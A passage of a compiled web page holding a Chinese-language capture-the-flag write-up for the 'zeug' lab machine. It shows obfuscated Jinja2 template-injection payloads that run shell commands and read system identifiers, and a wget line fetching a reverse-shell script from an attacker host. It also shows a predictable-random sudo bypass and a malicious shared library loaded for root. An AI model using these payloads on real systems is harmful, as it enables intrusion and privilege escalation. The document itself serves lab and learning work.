usr\ndrwxr-xr-x 12 root root 4.0K Jan 6 15:16 var\nlrwxrwxrwx 1 root root 27 Jan 6 13:28 vmlinuz -> boot/vmlinuz-6.1.0-17-amd64\nlrwxrwxrwx 1 root root 27 Jan 6 13:01 vmlinuz.old -> boot/vmlinuz-6.1.0-15-amd64\n'})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="ls -lh /home/cosette"',children:'# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\\"o"+"s\\").po"+"pen(\\"ls -lh /home/co"+"sette\\").read()")}}\ntotal 20K\n-rwx------ 1 cosette cosette 16K Jan 7 13:13 seed_bak\ndrwx------ 6 cosette cosette 4.0K Jan 7 09:54 zeug\n'})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="ls -lh /home/cosette/zeug"',children:'# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\\"o"+"s\\").po"+"pen(\\"ls -lh /home/co"+"sette/zeug\\").read()")}}\ntotal 20K\n-rwx------ 1 cosette cosette 2.5K Jan 7 09:54 app.py\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:43 __pycache__\ndrwx------ 3 cosette cosette 4.0K Jan 6 15:30 static\ndrwx------ 2 cosette cosette 4.0K Jan 6 19:18 templates\ndrwx------ 5 cosette cosette 4.0K Jan 6 16:31 venv\n'})}),"\n",(0,o.jsx)(n.h3,{id:"\u8bfb\u53d6\u73af\u5883\u4fe1\u606f",children:"\u8bfb\u53d6\u73af\u5883\u4fe1\u606f"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="ls -lh /sys/class/net/"',children:'# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\\"o"+"s\\").po"+"pen(\\"ls -lh /sys/class/net/\\").read()")}}\ntotal 0\nlrwxrwxrwx 1 root root 0 Feb 5 20:11 enp0s3 -> ../../devices/pci0000:00/0000:00:03.0/net/enp0s3\nlrwxrwxrwx 1 root root 0 Feb 5 20:11 lo -> ../../devices/virtual/net/lo\n'})}),"\n",(0,o.jsx)(n.p,{children:"\u83b7\u5f97\u8ba1\u7b97 PIN \u503c\u9700\u8981\u7684\u4fe1\u606f"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="cat /sys/class/net/enp0s3/address"',children:'# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\\"o"+"s\\").po"+"pen(\\"cat /sys/class/net/enp0s3/address\\").read()")}}\n08:00:27:05:3b:5c\n'})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="cat /proc/sys/kernel/random/boot_id"',children:'# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\\"o"+"s\\").po"+"pen(\\"cat /proc/sys/kernel/random/boot_id\\").read()")}}\n7fc0efd5-5586-43eb-bef5-72b7b0a675b1\n'})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="cat /proc/self/cgroup"',children:'# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\\"o"+"s\\").po"+"pen(\\"cat /proc/self/cgroup\\").read()")}}\n0::/system.slice/zeug-app.service\n'})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="ls -lh /home/cosette/zeug/venv"',children:"total 16K\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:48 bin\ndrwx------ 3 cosette cosette 4.0K Jan 6 16:31 include\ndrwx------ 3 cosette cosette 4.0K Jan 6 16:31 lib\nlrwxrwxrwx 1 cosette cosette 3 Jan 6 16:31 lib64 -> lib\n-rwx------ 1 cosette cosette 162 Jan 6 16:31 pyvenv.cfg\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="ls -lh /home/cosette/zeug/venv/lib/python3.11/site-packages"',children:'# {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\\"o"+"s\\").po"+"pen(\\"ls -lh /home/co"+"sette/zeug/venv/lib/python3.11/site-packages\\").read()")}}\ntotal 144K\ndrwx------ 4 cosette cosette 4.0K Jan 6 16:50 bleach\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:50 bleach-6.1.0.dist-info\ndrwx------ 3 cosette cosette 4.0K Jan 6 16:48 blinker\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:48 blinker-1.7.0.dist-info\ndrwx------ 3 cosette cosette 4.0K Jan 6 16:48 click\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:48 click-8.1.7.dist-info\ndrwx------ 3 cosette cosette 4.0K Jan 6 16:31 _distutils_hack\n-rwx------ 1 cosette cosette 151 Jan 6 16:31 distutils-precedence.pth\ndrwx------ 5 cosette cosette 4.0K Jan 6 16:48 flask\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:48 flask-3.0.0.dist-info\ndrwx------ 3 cosette cosette 4.0K Jan 6 16:48 itsdangerous\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:48 itsdangerous-2.1.2.dist-info\ndrwx------ 3 cosette cosette 4.0K Jan 6 16:48 jinja2\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:48 Jinja2-3.1.2.dist-info\ndrwx------ 3 cosette cosette 4.0K Jan 6 16:48 markupsafe\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:48 MarkupSafe-2.1.3.dist-info\ndrwx------ 5 cosette cosette 4.0K Jan 6 16:31 pip\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:31 pip-23.0.1.dist-info\ndrwx------ 5 cosette cosette 4.0K Jan 6 16:31 pkg_resources\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:50 __pycache__\ndrwx------ 8 cosette cosette 4.0K Jan 6 16:31 setuptools\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:31 setuptools-66.1.1.dist-info\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:50 six-1.16.0.dist-info\n-rwx------ 1 cosette cosette 34K Jan 6 16:50 six.py\ndrwx------ 3 cosette cosette 4.0K Jan 6 16:50 webencodings\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:50 webencodings-0.5.1.dist-info\ndrwx------ 9 cosette cosette 4.0K Jan 6 16:48 werkzeug\ndrwx------ 2 cosette cosette 4.0K Jan 6 16:48 werkzeug-3.0.1.dist-info\n'})}),"\n",(0,o.jsx)(n.p,{children:"\u53ef\u4ee5\u5f97\u5230\u76f8\u5173\u7684\u5305\u7684\u7248\u672c\u4fe1\u606f"}),"\n",(0,o.jsxs)(n.table,{children:[(0,o.jsx)(n.thead,{children:(0,o.jsxs)(n.tr,{children:[(0,o.jsx)(n.th,{style:{textAlign:"center"},children:"Package Name"}),(0,o.jsx)(n.th,{style:{textAlign:"center"},children:"Version"})]})}),(0,o.jsxs)(n.tbody,{children:[(0,o.jsxs)(n.tr,{children:[(0,o.jsx)(n.td,{style:{textAlign:"center"},children:"werkzeug"}),(0,o.jsx)(n.td,{style:{textAlign:"center"},children:"3.0.1"})]}),(0,o.jsxs)(n.tr,{children:[(0,o.jsx)(n.td,{style:{textAlign:"center"},children:"Flask"}),(0,o.jsx)(n.td,{style:{textAlign:"center"},children:"3.0.0"})]})]})]}),"\n",(0,o.jsxs)(t,{children:[(0,o.jsx)("summary",{children:" werkzeug 3.0.1 PIN Code \u8ba1\u7b97\u90e8\u5206\u7684\u539f\u59cb\u811a\u672c "}),(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-python",children:'from __future__ import annotations\n\nimport getpass\nimport hashlib\nimport json\nimport os\nimport pkgutil\nimport re\nimport sys\nimport time\nimport typing as t\nimport uuid\nfrom contextlib import ExitStack\nfrom io import BytesIO\nfrom itertools import chain\nfrom os.path import basename\nfrom os.path import join\nfrom zlib import adler32\n\nfrom .._internal import _log\nfrom ..exceptions import NotFound\nfrom ..http import parse_cookie\nfrom ..security import gen_salt\nfrom ..utils import send_file\nfrom ..wrappers.request import Request\nfrom ..wrappers.response import Response\nfrom .console import Console\nfrom .tbtools import DebugFrameSummary\nfrom .tbtools import DebugTraceback\nfrom .tbtools import render_console_html\n\nif t.TYPE_CHECKING:\n    from _typeshed.wsgi import StartResponse\n    from _typeshed.wsgi import WSGIApplication\n    from _typeshed.wsgi import WSGIEnvironment\n\n# A week\nPIN_TIME = 60 * 60 * 24 * 7\n\n\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]\n\n\n_machine_id: str | bytes | None = None\n\n\ndef get_machine_id() -> str | bytes | None:\n    global _machine_id\n\n    if _machine_id is not None:\n        return _machine_id\n\n    def _generate() -> str | bytes | None:\n        linux = b""\n\n        # machine-id is stable across boots, boot_id is not.\n        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":\n            try:\n                with open(filename, "rb") as f:\n                    value = f.readline().strip()\n            except OSError:\n                continue\n\n            if value:\n                linux += value\n                break\n\n        # Containers share the same machine id, add some cgroup\n        # information. This is used outside containers too but should be\n        # relatively stable across boots.\n        try:\n            with open("/proc/self/cgroup", "rb") as f:\n                linux += f.readline().strip().rpartition(b"/")[2]\n        except OSError:\n            pass\n\n        if linux:\n            return linux\n\n        # On OS X, use ioreg to get the computer\'s serial number.\n        try:\n            # subprocess may not be available, e.g. Google App Engine\n            # https://github.com/pallets/werkzeug/issues/925\n            from subprocess import Popen, PIPE\n\n            dump = Popen(\n                ["ioreg", "-c", "IOPlatformExpertDevice", "-d", "2"], stdout=PIPE\n            ).communicate()[0]\n            match = re.search(b\'"serial-number" = <([^>]+)\', dump)\n\n            if match is not None:\n                return match.group(1)\n        except (OSError, ImportError):\n            pass\n\n        # On Windows, use winreg to get the machine guid.\n        if sys.platform == "win32":\n            import winreg\n\n            try:\n                with winreg.OpenKey(\n                    winreg.HKEY_LOCAL_MACHINE,\n                    "SOFTWARE\\\\Microsoft\\\\Cryptography",\n                    0,\n                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,\n                ) as rk:\n                    guid: str | bytes\n                    guid_type: int\n                    guid, guid_type = winreg.QueryValueEx(rk, "MachineGuid")\n\n                    if guid_type == winreg.REG_SZ:\n                        return guid.encode("utf-8")\n\n                    return guid\n            except OSError:\n                pass\n\n        return None\n\n    _machine_id = _generate()\n    return _machine_id\n\n\nclass _ConsoleFrame:\n    """Helper class so that we can reuse the frame console code for the\n    standalone console.\n    """\n\n    def __init__(self, namespace: dict[str, t.Any]):\n        self.console = Console(namespace)\n        self.id = 0\n\n    def eval(self, code: str) -> t.Any:\n        return self.console.eval(code)\n\n\ndef get_pin_and_cookie_name(\n    app: WSGIApplication,\n) -> tuple[str, str] | tuple[None, None]:\n    """Given an application object this returns a semi-stable 9 digit pin\n    code and a random key.  The hope is that this is stable between\n    restarts to not make debugging particularly frustrating.  If the pin\n    was forcefully disabled this returns `None`.\n\n    Second item in the resulting tuple is the cookie name for remembering.\n    """\n    pin = os.environ.get("WERKZEUG_DEBUG_PIN")\n    rv = None\n    num = None\n\n    # Pin was explicitly disabled\n    if pin == "off":\n        return None, None\n\n    # Pin was provided explicitly\n    if pin is not None and pin.replace("-", "").isdecimal():\n        # If there are separators in the pin, return it directly\n        if "-" in pin:\n            rv = pin\n        else:\n            num = pin\n\n    modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)\n    username: str | None\n\n    try:\n        # getuser imports the pwd module, which does not exist in Google\n        # App Engine. It may also raise a KeyError if the UID does not\n        # have a username, such as in Docker.\n        username = getpass.getuser()\n    except (ImportError, KeyError):\n        username = None\n\n    mod = sys.modules.get(modname)\n\n    # This information only exists to make the cookie unique on the\n    # computer, not as a security feature.\n    probably_public_bits = [\n        username,\n        modname,\n        getattr(app, "__name__", type(app).__name__),\n        getattr(mod, "__file__", None),\n    ]\n\n    # This information is here to make it harder for an attacker to\n    # guess the cookie name.  They are unlikely to be contained anywhere\n    # within the unauthenticated debug page.\n    private_bits = [str(uuid.getnode()), get_machine_id()]\n\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):\n        if not bit:\n            continue\n        if isinstance(bit, str):\n            bit = bit.encode("utf-8")\n        h.update(bit)\n    h.update(b"cookiesalt")\n\n    cookie_name = f"__wzd{h.hexdigest()[:20]}"\n\n    # If we need to generate a pin we salt it a bit more so that we don\'t\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b"pinsalt")\n        num = f"{int(h.hexdigest(), 16):09d}"[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don\'t have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = "-".join(\n                    num[x : x + group_size].rjust(group_size, "0")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    return rv, cookie_name\n\n\nclass DebuggedApplication:\n    """Enables debugging support for a given application::\n\n        from werkzeug.debug import DebuggedApplication\n        from myapp import app\n        app = DebuggedApplication(app, evalex=True)\n\n    The ``evalex`` argument allows evaluating expressions in any frame\n    of a traceback. This works by preserving each frame with its local\n    state. Some state, such as context globals, cannot be restored with\n    the frame by default. When ``evalex`` is enabled,\n    ``environ["werkzeug.debug.preserve_context"]`` will be a callable\n    that takes a context manager, and can be called multiple times.\n    Each context manager will be entered before evaluating code in the\n    frame, then exited again, so they can perform setup and cleanup for\n    each call.\n\n    :param app: the WSGI application to run debugged.\n    :param evalex: enable exception evaluation feature (interactive\n                   debugging).  This requires a non-forking server.\n    :param request_key: The key that points to the request object in this\n                        environment.  This parameter is ignored in current\n                        versions.\n    :param console_path: the URL for a general purpose console.\n    :param console_init_func: the function that is executed before starting\n                              the general purpose console.  The return value\n                              is used as initial namespace.\n    :param show_hidden_frames: by default hidden traceback frames are skipped.\n                               You can show them by setting this parameter\n                               to `True`.\n    :param pin_security: can be used to disable the pin based security system.\n    :param pin_logging: enables the logging of the pin system.\n\n    .. versionchanged:: 2.2\n        Added the ``werkzeug.debug.preserve_context`` environ key.\n    """\n\n    _pin: str\n    _pin_cookie: str\n\n    def __init__(\n        self,\n        app: WSGIApplication,\n        evalex: bool = False,\n        request_key: str = "werkzeug.request",\n        console_path: str = "/console",\n        console_init_func: t.Callable[[], dict[str, t.Any]] | None = None,\n        show_hidden_frames: bool = False,\n        pin_security: bool = True,\n        pin_logging: bool = True,\n    ) -> None:\n        if not console_init_func:\n            console_init_func = None\n        self.app = app\n        self.evalex = evalex\n        self.frames: dict[int, DebugFrameSummary | _ConsoleFrame] = {}\n        self.frame_contexts: dict[int, list[t.ContextManager[None]]] = {}\n        self.request_key = request_key\n        self.console_path = console_path\n        self.console_init_func = console_init_func\n        self.show_hidden_frames = show_hidden_frames\n        self.secret = gen_salt(20)\n        self._failed_pin_auth = 0\n\n        self.pin_logging = pin_logging\n        if pin_security:\n            # Print out the pin for the debugger on standard out.\n            if os.environ.get("WERKZEUG_RUN_MAIN") == "true" and pin_logging:\n                _log("warning", "* Debugger is active!")\n                if self.pin is None:\n                    _log("warning", "* Debugger PIN disabled. DEBUGGER UNSECURED!")\n                else:\n                    _log("info", "* Debugger PIN: %s", self.pin)\n        else:\n            self.pin = None\n\n    @property\n    def pin(self) -> str | None:\n        if not hasattr(self, "_pin"):\n            pin_cookie = get_pin_and_cookie_name(self.app)\n            self._pin, self._pin_cookie = pin_cookie  # type: ignore\n        return self._pin\n\n    @pin.setter\n    def pin(self, value: str) -> None:\n        self._pin = value\n\n    @property\n    def pin_cookie_name(self) -> str:\n        """The name of the pin cookie."""\n        if not hasattr(self, "_pin_cookie"):\n            pin_cookie = get_pin_and_cookie_name(self.app)\n            self._pin, self._pin_cookie = pin_cookie  # type: ignore\n        return self._pin_cookie\n\n    def debug_application(\n        self, environ: WSGIEnvironment, start_response: StartResponse\n    ) -> t.Iterator[bytes]:\n        """Run the application and conserve the traceback frames."""\n        contexts: list[t.ContextManager[t.Any]] = []\n\n        if self.evalex:\n            environ["werkzeug.debug.preserve_context"] = contexts.append\n\n        app_iter = None\n        try:\n            app_iter = self.app(environ, start_response)\n            yield from app_iter\n            if hasattr(app_iter, "close"):\n                app_iter.close()\n        except Exception as e:\n            if hasattr(app_iter, "close"):\n                app_iter.close()  # type: ignore\n\n            tb = DebugTraceback(e, skip=1, hide=not self.show_hidden_frames)\n\n            for frame in tb.all_frames:\n                self.frames[id(frame)] = frame\n                self.frame_contexts[id(frame)] = contexts\n\n            is_trusted = bool(self.check_pin_trust(environ))\n            html = tb.render_debugger_html(\n                evalex=self.evalex,\n                secret=self.secret,\n                evalex_trusted=is_trusted,\n            )\n            response = Response(html, status=500, mimetype="text/html")\n\n            try:\n                yield from response(environ, start_response)\n            except Exception:\n                # if we end up here there has been output but an error\n                # occurred.  in that situation we can do nothing fancy any\n                # more, better log something into the error log and fall\n                # back gracefully.\n                environ["wsgi.errors"].write(\n                    "Debugging middleware caught exception in streamed"\n                    "response at a point where response headers were already"\n                    "sent.\\n"\n                )\n\n            environ["wsgi.errors"].write("".join(tb.render_traceback_text()))\n\n    def execute_command(# type: ignore[return]\n        self,\n        request: Request,\n        command: str,\n        frame: DebugFrameSummary | _ConsoleFrame,\n    ) -> Response:\n        """Execute a command in a console."""\n        contexts = self.frame_contexts.get(id(frame), [])\n\n        with ExitStack() as exit_stack:\n            for cm in contexts:\n                exit_stack.enter_context(cm)\n\n            return Response(frame.eval(command), mimetype="text/html")\n\n    def display_console(self, request: Request) -> Response:\n        """Display a standalone shell."""\n        if 0 not in self.frames:\n            if self.console_init_func is None:\n                ns = {}\n            else:\n                ns = dict(self.console_init_func())\n            ns.setdefault("app", self.app)\n            self.frames[0] = _ConsoleFrame(ns)\n        is_trusted = bool(self.check_pin_trust(request.environ))\n        return Response(\n            render_console_html(secret=self.secret, evalex_trusted=is_trusted),\n            mimetype="text/html",\n        )\n\n    def get_resource(self, request: Request, filename: str) -> Response:\n        """Return a static resource from the shared folder."""\n        path = join("shared", basename(filename))\n\n        try:\n            data = pkgutil.get_data(__package__, path)\n        except OSError:\n            return NotFound()  # type: ignore[return-value]\n        else:\n            if data is None:\n                return NotFound()  # type: ignore[return-value]\n\n            etag = str(adler32(data) & 0xFFFFFFFF)\n            return send_file(\n                BytesIO(data), request.environ, download_name=filename, etag=etag\n            )\n\n    def check_pin_trust(self, environ: WSGIEnvironment) -> bool | None:\n        """Checks if the request passed the pin test.  This returns `True` if the\n        request is trusted on a pin/cookie basis and returns `False` if not.\n        Additionally if the cookie\'s stored pin hash is wrong it will return\n        `None` so that appropriate action can be taken.\n        """\n        if self.pin is None:\n            return True\n        val = parse_cookie(environ).get(self.pin_cookie_name)\n        if not val or "|" not in val:\n            return False\n        ts_str, pin_hash = val.split("|", 1)\n\n        try:\n            ts = int(ts_str)\n        except ValueError:\n            return False\n\n        if pin_hash != hash_pin(self.pin):\n            return None\n        return (time.time() - PIN_TIME) < ts\n\n    def _fail_pin_auth(self) -> None:\n        time.sleep(5.0 if self._failed_pin_auth> 5 else 0.5)\n        self._failed_pin_auth += 1\n\n    def pin_auth(self, request: Request) -> Response:\n        """Authenticates with the pin."""\n        exhausted = False\n        auth = False\n        trust = self.check_pin_trust(request.environ)\n        pin = t.cast(str, self.pin)\n\n        # If the trust return value is `None` it means that the cookie is\n        # set but the stored pin hash value is bad.  This means that the\n        # pin was changed.  In this case we count a bad auth and unset the\n        # cookie.  This way it becomes harder to guess the cookie name\n        # instead of the pin as we still count up failures.\n        bad_cookie = False\n        if trust is None:\n            self._fail_pin_auth()\n            bad_cookie = True\n\n        # If we\'re trusted, we\'re authenticated.\n        elif trust:\n            auth = True\n\n        # If we failed too many times, then we\'re locked out.\n        elif self._failed_pin_auth > 10:\n            exhausted = True\n\n        # Otherwise go through pin based authentication\n        else:\n            entered_pin = request.args["pin"]\n\n            if entered_pin.strip().replace("-", "") == pin.replace("-",""):\n                self._failed_pin_auth = 0\n                auth = True\n            else:\n                self._fail_pin_auth()\n\n        rv = Response(\n            json.dumps({"auth": auth, "exhausted": exhausted}),\n            mimetype="application/json",\n        )\n        if auth:\n            rv.set_cookie(\n                self.pin_cookie_name,\n                f"{int(time.time())}|{hash_pin(pin)}",\n                httponly=True,\n                samesite="Strict",\n                secure=request.is_secure,\n            )\n        elif bad_cookie:\n            rv.delete_cookie(self.pin_cookie_name)\n        return rv\n\n    def log_pin_request(self) -> Response:\n        """Log the pin if needed."""\n        if self.pin_logging and self.pin is not None:\n            _log(\n                "info", "* To enable the debugger you need to enter the security pin:"\n            )\n            _log("info", "* Debugger pin code: %s", self.pin)\n        return Response("")\n\n    def __call__(\n        self, environ: WSGIEnvironment, start_response: StartResponse\n    ) -> t.Iterable[bytes]:\n        """Dispatch the requests."""\n        # important: don\'t ever access a function here that reads the incoming\n        # form data!  Otherwise the application won\'t have access to that data\n        # any more!\n        request = Request(environ)\n        response = self.debug_application\n        if request.args.get("__debugger__") == "yes":\n            cmd = request.args.get("cmd")\n            arg = request.args.get("f")\n            secret = request.args.get("s")\n            frame = self.frames.get(request.args.get("frm", type=int))  # type: ignore\n            if cmd == "resource" and arg:\n                response = self.get_resource(request, arg)  # type: ignore\n            elif cmd == "pinauth" and secret == self.secret:\n                response = self.pin_auth(request)  # type: ignore\n            elif cmd == "printpin" and secret == self.secret:\n                response = self.log_pin_request()  # type: ignore\n            elif (\n                self.evalex\n                and cmd is not None\n                and frame is not None\n                and self.secret == secret\n                and self.check_pin_trust(environ)\n            ):\n                response = self.execute_command(request, cmd, frame)  # type: ignore\n        elif (\n            self.evalex\n            and self.console_path is not None\n            and request.path == self.console_path\n        ):\n            response = self.display_console(request)  # type: ignore\n        return response(environ, start_response)\n\n'})})]}),"\n",(0,o.jsx)(n.h3,{id:"\u76f4\u63a5\u5229\u7528-popen-\u6784\u5efa\u547d\u4ee4\u6267\u884c\u53cd\u5f39-shell",children:"\u76f4\u63a5\u5229\u7528 popen \u6784\u5efa\u547d\u4ee4\u6267\u884c\u53cd\u5f39 shell"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title=""',children:'{{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\\"o"+"s\\").po"+"pen(\\"wget 192.168.56.102/reverse.sh -o /home/co"+"sette/reverse.sh\\").read()")}}\n'})}),"\n",(0,o.jsx)(n.admonition,{title:"\u672a\u77e5\u7684 PIN \u8ba1\u7b97\u95ee\u9898",type:"warning",children:(0,o.jsx)(n.p,{children:"\u6839\u636e\u6240\u5f97\u5230\u7684\u73af\u5883\u4fe1\u606f\uff0c\u6211\u5c1d\u8bd5\u5bf9 Flask Debug Console \u7684 PIN code \u8fdb\u884c\u8ba1\u7b97\uff0c\u786e\u8ba4\u8fc7\u8ba1\u7b97\u7684\u811a\u672c\u5c31\u662f\u6765\u81ea Flask \u6e90\u7801\uff0c\u4f46\u662f\u8ba1\u7b97\u51fa\u6765\u7684 PIN Code \u4e0d\u88ab Flask Debug Console \u6240\u63a5\u53d7\uff0c\u8fd9\u91cc\u53ef\u80fd\u5b58\u5728\u4e00\u5b9a\u7684\u5904\u7406\u95ee\u9898\uff0c\u5efa\u8bae\u76f4\u63a5\u4f7f\u7528 SSTI \u6784\u9020\u547d\u4ee4\u6267\u884c\uff0c\u4e0a\u4f20\u53cd\u5f39 shell \u7684\u811a\u672c\uff0c\u7136\u540e\u76f4\u63a5\u53cd\u5f39 shell"})}),"\n",(0,o.jsx)(n.h2,{id:"user---cosette",children:"User - cosette"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="ls -lah"',children:"lrwxrwxrwx 1 cosette cosette    9 Jan  6 23:22 .bash_history -> /dev/null\n-rwx------ 1 cosette cosette  220 Apr 23  2023 .bash_logout\n-rwx------ 1 cosette cosette 3.5K Apr 23  2023 .bashrc\ndrwx------ 3 cosette cosette 4.0K Jan  6 16:19 .local\n-rwx------ 1 cosette cosette  807 Apr 23  2023 .profile\n-rwx------ 1 cosette cosette  16K Jan  7 13:13 seed_bak\ndrwx------ 6 cosette cosette 4.0K Feb  6 02:52 zeug\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u5c06 seed_bak \u8fdb\u884c\u53cd\u7f16\u8bd1\uff0c\u5f97\u5230"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-c",children:'int __fastcall main(int argc, const char **argv, const char **envp)\n{\n    int v4; // [rsp+Ch] [rbp-14h] BYREF\n    int v5; // [rsp+10h] [rbp-10h]\n    int v6; // [rsp+14h] [rbp-Ch]\n    unsigned __int64 v7; // [rsp+18h] [rbp-8h]\n\n    v7 = __readfsqword(0x28u);\n    banner(argc, argv, envp);\n    srand(1u);\n    v5 = rand();\n    v6 = -559038737;\n    v4 = 0;\n    printf("Enter a number:");\n    __isoc99_scanf("%d", &v4);\n    if (v6 == (v5 ^ v4) )\n    system("/bin/bash");\n    else\n    puts("Wrong.");\n    return 0;\n}\n'})}),"\n",(0,o.jsx)(n.h3,{id:"\u4f2a\u968f\u673a\u653b\u51fb",children:"\u4f2a\u968f\u673a\u653b\u51fb"}),"\n",(0,o.jsx)(n.p,{children:"\u7b80\u5355\u7f16\u5199\u4e00\u4e2a\u4f2a\u968f\u673a\u7684\u8ba1\u7b97\u811a\u672c"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-c",children:'#include <stdio.h>\n#include <stdlib.h>\n\nint main()\n{\n    int v5; // [rsp+10h] [rbp-10h]\n    srand(1u);\n    v5 = rand();\n    int v6 = -559038737;\n    printf("%d\\n", v5 ^ v6);\n    return 0;\n}\n// -1255736440\n'})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",metastring:'title="Exploit it"',children:"(remote) cosette@zeug:/home/cosette$ sudo -l\nMatching Defaults entries for cosette on zeug:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser cosette may run the following commands on zeug:\n    (exia) NOPASSWD: /home/exia/seed\n(remote) cosette@zeug:/home/cosette$ sudo -u exia /home/exia/seed\n********************************************\n* Hi, Cosette, it's time to plant the seed *\n********************************************\nEnter a number: -1255736440\nexia@zeug:/home/cosette$ whoami\nexia\n"})}),"\n",(0,o.jsx)(n.h2,{id:"user---exia",children:"User - exia"}),"\n",(0,o.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:"exia@zeug:~$ cat user.txt\nHMYVM{exia_1XZ2GUy6gwSRwXwFUKEkZC6cT}\n"})}),"\n",(0,o.jsx)(n.h3,{id:"\u52a8\u6001\u5e93\u6267\u884c\u4ee3\u7801\u6ce8\u5165",children:"\u52a8\u6001\u5e93\u6267\u884c\u4ee3\u7801\u6ce8\u5165"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for exia on zeug:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser exia may run the following commands on zeug:\n    (root) NOPASSWD: /usr/bin/zeug\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u53cd\u7f16\u8bd1 zeug \u7a0b\u5e8f\uff0c\u5f97\u5230"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-c",children:'int __fastcall main(int argc, const char **argv, const char **envp)\n{\n    if (dlopen("/home/exia/exia.so", 2) )\n    return 0;\n    fwrite("Error opening file\\n", 1uLL, 0x13uLL, _bss_start);\n    return 1;\n}\n'})}),"\n",(0,o.jsx)(n.p,{children:"\u53ef\u4ee5\u731c\u6d4b\u662f\u8981\u501f\u52a9 dlopen \u52a0\u8f7d\u4f9d\u8d56\u5e93\u5b9e\u73b0\u4ee3\u7801\u6ce8\u5165"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-c",metastring:'title="exia.c"',children:'#include <stdio.h>\n#include <stdlib.h>\n\n__attribute__((constructor))\nvoid init()\n{\n    puts("Hello dynamic linkage world!");\n    system("/bin/bash");\n}\n'})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",metastring:'title="Exploit it"',children:"(remote) exia@zeug:/home/exia$ gcc -shared -fPIC -o exia.so exia.c\n(remote) exia@zeug:/home/exia$ sudo -u root /usr/bin/zeug\nHello dynamic linkage world!\nroot@zeug:/home/exia# whoami\nroot\n"})}),"\n",(0,o.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,o.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"root@zeug:~# cat root.txt\nHMYVM{root_Ut9RX5o7iZVKXjrOgcGW3fxBq}\n"})})]})}function p(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(u,{...e})}):u(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>a});var r=t(96540);const o={},s=r.createContext(o);function i(e){const n=r.useContext(s);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof 